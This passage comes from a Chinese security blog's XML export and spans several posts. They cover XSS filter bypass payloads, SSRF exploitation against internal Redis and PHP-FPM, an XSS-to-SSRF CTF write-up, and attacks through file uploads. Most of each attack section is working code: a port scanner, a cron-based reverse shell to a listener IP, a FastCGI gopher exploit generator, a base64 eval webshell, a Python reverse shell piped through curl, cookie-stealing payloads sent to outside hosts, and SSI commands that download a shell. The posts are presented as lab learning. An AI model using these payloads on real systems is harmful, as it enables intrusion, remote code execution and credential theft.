1&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL%2b0,onerror=eval,/1/g%2ba[12]%2b[1337]%2ba[13]&lt;/script&gt; 可以看到，在该payloa中，作者非常巧妙的利用a=URL+0的方式将function与字符相加变为字符串，即a为&quot;function URL() { [native code] }0&quot;，然后从a取相应的字符使用。利用这种方式去拼接被过滤的关键词的确为一种很好的思路。 还有通过使用类型错误自动将字符串发送到异常处理程序的方法，这使得我们完全不需要throw语句。1&lt;script&gt;TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']&lt;/script&gt; 0x02 利用JavaScript全局变量绕过XSS过滤器这里所说的javascript全局变量是指利用self或者window调用任意javascript代码。比如说调用alert方法，可以使用self[&quot;alert&quot;]如果alert关键词被过滤，使用全局变量的方法甚至可以使用字符串拼接1&lt;script&gt;self["al"+"ert"](1)&lt;/script&gt; 同样因为是在字符串中，可以使用十六进制编码、base64编码等123456789/*** alert(document.cookie)*/self["\x61\x6c\x65\x72\x74"]( self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"] ["\x63\x6f\x6f\x6b\x69\x65"]) 另外，网站中如果使用了jQuery之类的第三方库。可以利用这些第三方库中的全局变量比如在JQuery中12345self["$"]["globalEval"]("alert(1)"); self["\x24"]["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x31\x29"); 甚至可以使用self[&quot;$&quot;][&quot;getScript&quot;](url)来加载任意js文件1self["$"]["getScript"]("https://example.com/my.js"); 另外还可以使用javascript迭代器Object.keys和正则表达式的方法去获取指定函数。123456789101112131415161718a = function() &#123; c=0; // index counter for(i in self) &#123; if(/^a[rel]+t$/.test(i)) &#123; return c; &#125; c++; &#125;&#125;// in one linea=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125;// then you can use a() with Object.keys// alert("foo")self[Object.keys(self)[a()]]("foo") 使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。 如果与第一种方法相结合，更是可以组合出更有效的payload1234&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[`on`%2b`error`]=eval,/1/g%2ba[12]%2b"self[`document`][`cookie`]"%2ba[13]&lt;/script&gt;&lt;script&gt;TypeError.prototype.name="=/",0[self[`on`%2b`error`]=self["eval"]]["/-self[`alert`](self[`document`][`cookie`])//"]&lt;/script&gt; 0x03 参考链接https://portswigger.net/blog/xss-without-parentheses-and-semi-colonshttps://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF的一些利用姿势]]></title>
    <url>%2FSSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[0x00 前言SSRF（Server-Side RequestForgery）服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。关于ssrf的利用，一般有下面几种 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 利用 file 协议读取本地文件等 攻击运行在内网或本地的应用程序 对内网 WEB 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等） 本文漏洞环境使用如下代码123456789101112&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET['url'];curl($url);?&gt; 0x01 协议探测在对ssrf漏洞深入利用之前首先要做协议探测，在只有知道其支持哪些协议的情况下，才可以利用这些协议进行进一步的利用。协议探测的方法比较简单，可以在vps上监听一个端口，然后用相关协议尝试连接即可。常见协议及可利用方向如下 dict （操作Redis） file （任意文件读取） ftp、ftps （FTP爆破） tftp（UDP协议扩展） gopher （操作Redis、Memcached、fastcgi、mysql等） imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） rtsp smb/smbs （连接SMB） telnet – 连接SSH/Telnet http、https – 内网服务探测 网络服务探测 ShellShock命令执行 JBOSS远程Invoker war命令执行 Java调试接口命令执行 axis2-admin部署Server命令执行 Jenkins Scripts接口命令执行 Confluence SSRF Struts2一堆命令执行 counchdb WEB API远程命令执行 mongodb SSRF docker API远程命令执行 php_fpm/fastcgi 命令执行 tomcat命令执行 Elasticsearch引擎Groovy脚本命令执行 WebDav PUT上传任意文件 WebSphere Admin可部署war间接命令执行 Apache Hadoop远程命令执行 zentoPMS远程命令执行 HFS远程命令执行 glassfish任意文件读取和war文件部署间接命令执行 其中file dict gopher http/https较为常用，下面进行相应的实例演示 0x02 内网端口探测端口探测又利于快速定位内网开启了哪些服务，以便用于后续进一步的利用利用dict ftp gopher telnet等协议在端口开放和关闭连接时间的长短及返回banner的不同可判断端口是否开放以及可能存在的服务。当然端口的探测存在一些其他的因素导致结果误报，如网络状况服务器性能等都有可能影响连接的时间。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsimport timeimport threadingimport Queuelock = threading.Lock()threads_count = 10scheme = 'gopher'ports = [21,22,23,25,69,80,81,82,83,84,110,389,389,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]ip_block = '192.168.111'class WyWorker(threading.Thread): def __init__(self,queue): threading.Thread.__init__(self) self.queue = queue def run(self): while True: if self.queue.empty(): break try: url = self.queue.get() time.sleep(0.3) r = requests.get(url,timeout=5) except: lock.acquire() ip_port = url.split(':') ip = ip_port[-2][2:] port = ip_port[-1] print "[+]&#123;ip&#125; : &#123;port&#125; Open".format(ip=ip,port=port) lock.release()# payload queue queue = Queue.Queue()for c in xrange(0,255): ip = '&#123;0&#125;.&#123;1&#125;'.format(ip_block,c) for port in ports: payload = '&#123;scheme&#125;://&#123;ip&#125;:&#123;port&#125;'.format( scheme=scheme, ip=ip, port=port ) #print payload url = "http://192.168.111.149/ssrf.php?url=&#123;payload&#125;".format(payload=payload) queue.put(url)threads = []for i in xrange(threads_count): threads.append(WyWorker(queue))for t in threads: t.start()for t in threads: t.join()while queue.qsize()&gt;0: time.sleep(1) 0x03 file协议任意文件读取当存在ssrf并file协议可用时，可以实现任意文件读取file:///etc/passwd 0x04 gopher协议攻击内网redis当存在一个ssrf漏洞并且支持gopher协议时，可以攻击内网中存在未授权访问漏洞的redis以扩大战果。要想利用gopher协议攻击redis，首先需要将请求转换为gopher协议所能理解的方式。这里我们利用bash脚本对redis发出的访问请求，利用socat进行端口转发获取请求内容下面是反弹shell的bash脚本123456#!shellecho -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.111.145/2333 0&gt;&amp;1\n\n"|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit socat端口转发命令,该命令将请求的4444端口转发到6379端口，即我们请求4444端口相当于请求redis服务器的6379端口1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 首先运行socat端口转发命令，等待端口转发。然后运行bash脚本bash redis_exp.sh 127.0.0.1 4444请求本地4444端口。socat端会打印出redis交互过程将内容复制到redis.txt，然后利用下面的python脚本将请求转化为gopher协议理解的内容 12345678910111213141516171819202122#coding: utf-8import sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue elif line[-3:-1] == r'\r': if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\r', '%0d%0a') line = line.replace('\n', '') exp = exp + line elif line == '\x0a': exp = exp + '%0a' else: line = line.replace('\n', '') exp = exp + lineprint exp 运行脚本进行转换python redis_gopher.py redis.txt转换的格式为1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.111.145/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a 此时可本地通过curl验证，返回五个ok,即我们前面的五条命令执行成功。此时回到一个存到ssrf的web页面将上面的padload进行url编码然后添加到漏洞页面，进行访问即可1http://192.168.111.149/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2462%250d%250a%250a%250a*%2F1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.145%2F2333%200%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a 如果漏洞页面有回显，也可看到返回五个ok此时在服务器监听端口即可收到反弹的shell 0x05 gopher协议攻击内网PHP-FPMPHP-FRM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP传送给FRM进行解析。当FRM可以未授权访问时，可以通过构造fastcgi协议包发送给FRM.以实现任意代码执行。漏洞具体成因可以查看p神的文章https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 当PHP-FRM以tcp模式运行时，会监听本地一个端口（默认为9000）用于接收来自Nginx等服务器中间件发送的请求我们构造该请求，并且可以转换为gopher协议支持的方式，当外网web页面存在ssrf漏洞并且支持gopher协议时，即可利用gopher协议利用内网PHP-FRM执行任意代码。首先附上前人编写的exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255import socketimport base64import randomimport argparseimport sysfrom io import BytesIOimport urllib# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: """A Fast-CGI Client for Python""" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \ + bchr(fcgi_type) \ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \ + bchr(requestid &amp; 0xFF) \ + bchr((length &gt;&gt; 8) &amp; 0xFF) \ + bchr(length &amp; 0xFF) \ + bchr(0) \ + bchr(0) \ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): # if not self.__connect(): # print('connect failure! please check your fasctcgi-server !!') # return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b"" beginFCGIRecordContent = bchr(0) \ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \ + bchr(self.keepalive) \ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) #print base64.b64encode(request) return request # self.sock.send(request) # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND # self.requests[requestId]['response'] = b'' # return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return "fastcgi connect host:&#123;&#125; port:&#123;&#125;".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = "/" uri = args.file content = args.code params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': "localhost", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': "%d" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; response = client.request(params, content) response = urllib.quote(response) print("gopher://127.0.0.1:" + str(args.port) + "/_" + response) 使用方式python exp.py -c phpcode -p port host filename这里需要注意的是，PHP-FRM在接收到请求时，会首先查看要操作的文件是否存在，因此这里需要提供filename并且为已知路径的php文件。如果不知道的话，可以使用服务器安装php时默认安装的php文件然后即可利用上面的exp生成payload1python fastcgi_gopher.py -c "&lt;?php echo ' xxxx &gt;&gt;';echo @eval(system('whoami'));exit; ?&gt;" -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php 通过ssrf漏洞页面提交payload时需要将其再进行一次Url编码 同样可以利用代码执行写入一句话webshell1python fastcgi_gopher.py -c "&lt;?php file_put_contents('/home/www/html/boogle.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYm9vZ2xlXSk7Pz4=')); ?&gt;" -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php 如果目录没有权限写入的话还可以反弹shell这里使用bash反弹有点问题，改用python。开一个web服务，bash.py中写入1234567import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("192.168.111.145",2333)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call(["/bin/sh","-i"]) 然后在192.168.111.145监听2333端口padload如下1python fastcgi_gopher.py -c "&lt;?php eval(system('curl http://192.168.111.145/bash.py|python'));die('-------boo--------'); ?&gt;" -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php 0x06 后记本文依照前人经验进行了一波学习，仅在未加任何防护的代码上了进行了ssrf常用手法的测试。ssrf可以说是一扇通往内网的大门，虽然可能会因为种种限制或者没有回显而难以利用，但其一旦被撕开，内网将会深入其害，ssrf姿势千姿百态，日后碰到其他骚姿势将继续记录。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSRF攻击内网redis]]></title>
    <url>%2FXSSRF%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91redis%2F</url>
    <content type="text"><![CDATA[0X00 前言由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。 在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。 0x01 XSS获取管理员cooklie环境地址:https://xssrf.hackme.inndy.tw在该环境中有一个send email的功能，可以给管理员发送含有xss的payload以获取其cookie。这里简单测试。发现过滤了&lt;script ( ) onerror等关键词。这里可以看到onerror前面是加了空格的，那么可以用下面的payload染过payload1&lt;img src="x"onerror="document.location='http://ay82rc.ceye.io/'+document.cookie"&gt; 发送后管理员查看即可成功返回cookie。 0x02 xss登陆内网后台拿到cookie后这里直接以cookie登陆，发现限制了管理员需要从内网登陆。这里也符合很多实际场景。 那么这里可以直接使用xss然后通过document.body.innerHTML打印出其后台页面。修改上面的payload，但是上面已经过滤()，这里可以使用编码绕过。推荐余弦大大的xss在线编码平台xss’or1&lt;img src="x"onerror="document.location='http://ay82rc.ceye.io/'+btoa(document.body.innerHTML)"&gt; 16进制编码后1&lt;img src="x"onerror="&amp;#x0064;&amp;#x006f;&amp;#x0063;&amp;#x0075;&amp;#x006d;&amp;#x0065;&amp;#x006e;&amp;#x0074;&amp;#x002e;&amp;#x006c;&amp;#x006f;&amp;#x0063;&amp;#x0061;&amp;#x0074;&amp;#x0069;&amp;#x006f;&amp;#x006e;&amp;#x003d;&amp;#x0027;&amp;#x0068;&amp;#x0074;&amp;#x0074;&amp;#x0070;&amp;#x003a;&amp;#x002f;&amp;#x002f;&amp;#x0061;&amp;#x0079;&amp;#x0038;&amp;#x0032;&amp;#x0072;&amp;#x0063;&amp;#x002e;&amp;#x0063;&amp;#x0065;&amp;#x0079;&amp;#x0065;&amp;#x002e;&amp;#x0069;&amp;#x006f;&amp;#x002f;&amp;#x0027;&amp;#x002b;&amp;#x0062;&amp;#x0074;&amp;#x006f;&amp;#x0061;&amp;#x0028;&amp;#x0064;&amp;#x006f;&amp;#x0063;&amp;#x0075;&amp;#x006d;&amp;#x0065;&amp;#x006e;&amp;#x0074;&amp;#x002e;&amp;#x0062;&amp;#x006f;&amp;#x0064;&amp;#x0079;&amp;#x002e;&amp;#x0069;&amp;#x006e;&amp;#x006e;&amp;#x0065;&amp;#x0072;&amp;#x0048;&amp;#x0054;&amp;#x004d;&amp;#x004c;&amp;#x0029;"&gt; 成功获取到内容将内容base64解码保存为html即可看到后台内容,并且登陆账号为admin。 这里可以看到两个管理员所特有的功能点set admin send request继续获取一下request.php的内容12345678910&lt;img src="x"onerror="xmlhttp = new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200)&#123; document.location = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open("GET","request.php",true);xmlhttp.send();"&gt; 将payload编码发送,注意这里ceye服务器收不到回显，不知为何，改用自己的vps 成功读取到request.php页面内容。base64解码后看到有发送url的操作，这里猜测具有ssrf 0x02 xssrf file协议任意文件读取继续构造payload，利用ssrf通过file协议读取/etc/passwd1234567891011&lt;img src="x"onerror="xmlhttp = new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200)&#123; document.location = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open("POST","request.php",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send("url=file:///etc/passwd");"&gt; 发现可以获取到/etc/passwd至此已经可以任意文件读取了，这是一道ctf题目，在robots.txt中提示让读取config.php那么我们便可以继续修改上面的payload读取config.php。进一步获取到在内网25566端口运行着redis那么便可以通过gopher协议去攻击内网redis了。 0X04 xssrf gopher协议攻击内网redis1234567891011&lt;img src="x"onerror="xmlhttp = new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200)&#123; document.location = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open("POST","request.php",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send("url=gopher://127.0.0.1:25566/_info%250a_quit");"&gt; 成功获得redis info信息。 0x05 参考链接https://skysec.top/2018/08/17/xss-ssrf-redis/https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用https://www.cnblogs.com/go2bed/p/4136358.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传功能的一些另类利用]]></title>
    <url>%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%A6%E7%B1%BB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。 0x01 XSS关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：File Upload XSS 文件名xsswindows下文件名不能包含 / \ : * ? “ &lt; &gt; | 字符，而linux下是可以出现除 / 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。 svg文件svg它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形，是一种图片文件格式。当服务端允许上传svg类型的文件时，可进行Xss。1&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert("svg-xss")/&gt; 0x02 SSI InjectionSSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。详细参考https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection 也就说一个web服务如果开启了SSI功能，即可通过上传shtml进行文件读取甚至命令执行。1234567891011121314151617181920payloadLinux:List files of directory:&lt;!--#exec cmd="ls" --&gt;Access directories:&lt;!--#exec cmd="cd /root/dir/"&gt;Execution script:&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;Windows:List files of directory:&lt;!--#exec cmd="dir" --&gt;Access directories:&lt;!--#exec cmd="cd C:\admin\dir"&gt; 0X03 SSRF参考利用SVG图片和SSRF收集服务器内部信息该利用同样需要支持上传svg文件，由于它是xml结构，所以支持各种xml特性，其中一个特性是XLink，支持在xml文档中创建内部或外部的超链接。上传ssrf.xml1&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;&lt;svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"&gt;&lt;image height="30" width="30" xlink:href="http://192.168.111.149:3000/?ssrfsvg" /&gt;&lt;/svg&gt;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java代码审计入门之s2-002复现分析]]></title>
    <url>%2Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-002%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言入门JAVA代码审计的第二篇文章，复现分析S2-002 xss漏洞。 本篇在漏洞分析的基础上，重点追踪了struts2标签解析过程。 0x01 环境搭建官方公告中给出的漏洞影响版本为Struts 2.0.0 - Struts 2.0.11，因此本环境可以在之前分析s1-001漏洞环境上搭建，可参考前面的文章java代码审计入门之s2-001复现分析 在上面环境的基础上，继续创建xss_test.jsp12345678910&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;S2-002&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="&lt;s:url action="Xss" includeParams="all" &gt;&lt;/s:url&gt;"&gt;你好Struts2&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 创建Xss.java class12345678package com.demo.action;import com.opensymphony.xwork2.ActionSupport;public class Xss extends ActionSupport&#123; public String execute() throws Exception &#123; return SUCCESS; &#125;&#125; struct.xml中添加123&lt;action name="Xss" class="com.demo.action.Xss"&gt; &lt;result name="success"&gt;xss_test.jsp&lt;/result&gt;&lt;/action&gt; 0x02 代码分析首先看一下官方关于漏洞的描述可以看到漏洞主要原因是Struts 2框架在处理&lt;s:url&gt; 和&lt;s:a&gt;标签时，未对标签内的字符进行转义，导致XSS漏洞。在我们搭建的Demo中，以&lt;s:url&gt;标签为例进行分析这里需要说明的是struts2允许使用自定义的其自定义的标签，如上面的&lt;s:url&gt;即为struct2 url标签。在使用struts2标签时需在页面中添加&lt;%@ taglib uri =&quot;/struts-tags&quot; prefix =&quot;s&quot; 